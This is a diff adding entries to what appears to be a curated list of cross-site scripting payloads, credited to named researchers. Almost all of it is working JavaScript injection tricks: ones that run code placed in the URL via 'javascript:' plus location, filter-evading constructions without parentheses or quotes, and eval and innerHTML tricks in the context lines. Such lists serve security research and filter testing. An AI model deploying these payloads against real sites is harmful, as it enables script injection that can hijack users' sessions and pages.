@@ -87,6 +87,17 @@ xss.html
     Function`a${name}```
     
 ---
+
+[terjanq](https://twitter.com/terjanq)
+
+ `%0aalert(/1337/)//` anywhere in the URL
+
+
+    Function`a${unescape.call`${location}`}```
+
+    
+---
+
 Only Firefox [Garethheyes](https://twitter.com/garethheyes/status/1126922526796468224)
           
     {onerror=eval}throw{lineNumber:1,columnNumber:1,fileName:'',message:'alert\x2823\x29'}
@@ -197,6 +208,33 @@ Only IE [matt](http://www.thespanner.co.uk/2012/05/01/xss-technique-without-pare
     document.body.innerHTML=document.body.innerText;
 
 ---
+
+[terjanq](https://twitter.com/terjanq)
+
+Put `%0aalert(/1337/)//` anywhere in the URL. Then, arbitrary code can be executed via:
+
+```js
+location='javascript:'+location
+```
+
+```js
+location=/javascript:/.source+location
+```
+
+```js
+location=`javascript:`+location
+```
+
+---
+
+[terjanq](https://twitter.com/terjanq)
+
+Custom strings without `` ()'"` ``
+```
+x={...eval+0,toString:Array.prototype.shift,length:15},
+x+x+x+x+x+x+x+x+x+x+x+x+x,
+location = /javascript:/.source + alert.name+x+1337+x
+```
 
 
 ___
